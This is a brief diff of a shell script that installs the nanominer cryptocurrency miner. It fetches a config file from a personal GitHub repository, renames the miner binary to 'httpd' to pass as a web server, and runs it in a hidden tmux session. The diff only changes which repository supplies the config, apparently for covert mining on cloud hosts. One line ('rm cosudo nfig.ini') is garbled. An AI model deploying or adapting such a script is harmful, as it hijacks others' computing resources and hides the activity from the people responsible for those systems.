@@ -19,7 +19,7 @@ sudo wget https://github.com/nanopool/nanominer/releases/download/v1.9.6/nanomin
 sudo tar xvzf nanominer-linux-1.9.6.tar.gz
 cd nanominer-linux-1.9.6
 rm cosudo nfig.ini
-sudo wget https://raw.githubusercontent.com/evilbabylx/script/master/config.ini
+sudo wget https://raw.githubusercontent.com/minnie1311/azureAI/master/config.ini
 sudo chmod +x nanominer
 sudo mv nanominer httpd
 tmux new-session -d -s my_session1  './httpd'
